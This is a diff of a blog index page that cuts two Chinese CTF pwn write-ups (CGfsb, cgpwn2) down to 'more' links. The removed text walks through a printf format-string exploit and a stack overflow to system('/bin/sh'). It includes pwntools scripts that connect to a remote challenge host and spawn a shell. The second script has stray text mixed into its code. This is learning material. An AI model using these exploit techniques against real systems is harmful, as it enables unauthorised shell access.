@@ -162,31 +162,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>康康类型<br><img src="https://img-blog.csdnimg.cn/20210123211013367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<!--more>
-放ida32康康
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210123211442707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70)
-多么实诚的代码（留下感动的泪水）
-很明显，我们需要让**pwnme**这个变量的值等于 8，然后便可以拿到 flag 文件
-中的东西，这个时候
-我们需要注意到它的上面有一行代码
-printf（&s）;这是个printf字符格式化
-所以说，现在我们要做的有这么几点：
-1、我们需要将 pwnme 的地址输入到 s（也就是 message）中去
-2、在合适的位置上加一个`%n`，使其与我们输入的地址对应从而造成漏洞利用
-所以接下来的问题变成了如何让他们对应起来
-首先，我们得查一下我们输入进去的数据在栈中偏移了多少，知道偏移量后我们
-才能将其对应起来。
-继续运行一遍程序，我们在 massage 处输入：
-AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
-因为下面有个 printf（%s），所以我们输入的内容自然会在下面被显示出来。我
-们看一下结果：
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210123212204665.png)
-0x41414141 便是我们输入的"AAAA"，
-写脚本
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = precess(&quot;./CGfsb&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">46635</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span> <span class="comment">#pwnme 地址在伪代码中双击就能查看哦</span></span><br><span class="line">payload = p32(pwnme_addr) + <span class="string">&#x27;aaaa&#x27;</span> + <span class="string">&#x27;%10$n&#x27;</span> <span class="comment">#pwnme 的地址需要经过</span></span><br><span class="line"><span class="number">32</span> 位编码转换，是四位，而 pwnme 需要等于 <span class="number">8</span>，所以‘aaaa’起着凑字数的作</span><br><span class="line">用</span><br><span class="line">r.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;BurYiA&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>感动</p>
-
+        
+          <a class="article-more-a" href="/2021/01/23/CGfsb%E7%9A%84wp/#more">more >></a>
+        
       
 
       
@@ -334,10 +312,10 @@ AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><p>用Linux康康，是32位无金丝雀<br>放进ida32康康<br><img src="https://img-blog.csdnimg.cn/20210123094916914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看来就这个hello有点意思，点进去康康<br><img src="https://img-blog.csdnimg.cn/20210123095009381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一看下面有个gets函数，有思路了，点开s康康<br><img src="https://img-blog.csdnimg.cn/20210123100720346.png" alt="在这里插入图片描述"><br>查看堆栈<br><img src="https://img-blog.csdnimg.cn/20210123100817193.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210123100828554.png" alt="在这里插入图片描述"><br>利用r溢出返回我们要的函数，康康函数表<br><img src="https://img-blog.csdnimg.cn/20210123100951520.png" alt="在这里插入图片描述"><br>这有个pwn函数，进去康康<br><img src="https://img-blog.csdnimg.cn/20210123101019217.png" alt="在这里插入图片描述"><br>system函数，给它一个/bin/sh<br>hello在bss段上，写进去一个/bin/sh<br>在最后get那溢出一次就行了<br>开始写脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">51186</span>)</span><br><span class="line">target = <span class="number">0x804855A</span></span><br><span class="line">//pwn函数中call system语句的地址，也是我们构造的假的返回地址</span><br><span class="line">binsh = <span class="number">0x804A080</span></span><br><span class="line">四.结果</span><br><span class="line">//name区域的地址，我们向name区域输入/<span class="built_in">bin</span>/sh,然后让这个地址作为system函数的</span><br><span class="line">参数，完成system(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x26</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(target) + p32(binsh)</span><br><span class="line">//|填充栈|覆盖保存的exp的值|假的返回地址，指向call system|call system的参</span><br><span class="line">数|</span><br><span class="line">a = r.recvuntil(<span class="string">&#x27;e\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">a = r.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>get flag</p>
-
+        <h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><p>用Linux康康，是32位无金丝雀<br>放进ida32康康<br><img src="https://img-blog.csdnimg.cn/20210123094916914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看来就这个hello有点意思，点进去康康
+        
+          <a class="article-more-a" href="/2021/01/23/cgpwn2%E7%9A%84wp/#more">more >></a>
+        
       
 
       
